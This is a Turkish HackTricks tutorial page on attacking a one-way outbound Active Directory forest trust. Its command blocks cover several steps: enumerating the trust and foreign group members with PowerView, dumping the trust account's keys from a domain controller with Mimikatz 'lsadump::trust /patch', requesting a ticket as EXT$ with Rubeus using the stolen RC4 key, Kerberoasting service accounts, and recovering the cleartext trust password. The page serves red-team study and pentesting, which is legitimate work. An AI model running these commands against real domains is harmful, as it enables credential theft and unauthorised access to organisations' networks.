# Dış Orman Alanı - Tek Yönlü (Dışarıya Doğru)

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramanla öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi **HackTricks'te reklam vermek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek paylaşın.

</details>

Bu senaryoda **alanınız**, **farklı alanlardan** birincil bir **özneye bazı ayrıcalıklar** sağlamaktadır.

## Sorgulama

### Dışarıya Doğru Güven
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Güvenlik Hesabı Saldırısı

Bir güven ilişkisi kurulduğunda, burada **A** alanı ve **B** alanı olarak tanımlanan iki alan arasında bir güven ilişkisi kurulduğunda bir güvenlik açığı mevcuttur. Bu yapıda, **B** alanı, **A** alanına güvenini genişletirken, iki alan arasındaki kimlik doğrulama sürecinde önemli bir rol oynayan **A** alanında **B** alanı için özel bir hesap oluşturulur. Bu hesap, alanlar arasında hizmetlere erişmek için biletleri şifrelemek için kullanılır.

Burada anlaşılması gereken kritik nokta, bu özel hesabın parolasının ve karmasının, **A** alanındaki bir Etki Alanı Denetleyicisinden bir komut satırı aracı kullanılarak çıkarılabileceğidir. Bu işlemi gerçekleştirmek için kullanılan komut:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Bu çıkarım, hesabın adının ardından **$** ile belirlendiği için mümkündür ve bu hesap, "Domain Users" grubuna aittir ve dolayısıyla bu grupla ilişkili izinleri devralır. Bu, bireylerin bu hesabın kimlik bilgilerini kullanarak etki alanı **A**'ya karşı kimlik doğrulaması yapmasına olanak tanır.

**Uyarı:** Bu durumu kullanarak sınırlı izinlere sahip bir kullanıcı olarak etki alanı **A**'da bir dayanak noktası elde etmek mümkündür. Ancak, bu erişim, etki alanı **A** üzerinde numaralandırma yapmak için yeterlidir.

`ext.local`'in güvenen etki alanı ve `root.local`'in güvenilen etki alanı olduğu bir senaryoda, `root.local` içinde `EXT$` adında bir kullanıcı hesabı oluşturulur. Belirli araçlar aracılığıyla, Kerberos güven anahtarlarını dökerek `root.local` içindeki `EXT$` hesabının kimlik bilgileri ortaya çıkarılabilir. Bunu başarmak için kullanılacak komut:
```bash
lsadump::trust /patch
```
Ardından, başka bir araç komutunu kullanarak, çıkarılan RC4 anahtarını kullanarak `root.local` içinde `root.local\EXT$` olarak kimlik doğrulaması yapılabilir:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Bu kimlik doğrulama adımı, `root.local` içindeki hizmetleri sıralamak ve hatta sömürmek için olanak sağlar. Örneğin, Kerberoast saldırısı kullanarak hizmet hesabı kimlik bilgilerini çıkarmak mümkündür. Bunun için aşağıdaki komutu kullanabilirsiniz:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Açık metin güven parolası toplama

Önceki akışta, **açık metin parola** yerine (aynı zamanda mimikatz ile **dökülen**) güven hash'i kullanıldı.

Açık metin parolası, mimikatz'den \[ CLEAR ] çıktısını onaltılıktan dönüştürerek ve null baytları '\x00' kaldırarak elde edilebilir:

![](<../../.gitbook/assets/image (2) (1) (2) (1).png>)

Bazen bir güven ilişkisi oluşturulurken, güven için kullanıcı tarafından bir parola yazılması gerekebilir. Bu gösterimde, anahtar orijinal güven parolasıdır ve bu nedenle insan tarafından okunabilir. Anahtar döngüsü (30 gün) olduğunda, açık metin insan tarafından okunabilir olmayacak ancak teknik olarak hala kullanılabilir olacaktır.

Açık metin parolası, güven hesabının Kerberos gizli anahtarını kullanarak TGT istemek yerine güven hesabının kimlik doğrulamasını gerçekleştirmek için kullanılabilir. Burada, ext.local'dan root.local'e Domain Admins üyelerini sorgulama:

![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)

## Referanslar

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek paylaşın.

</details>
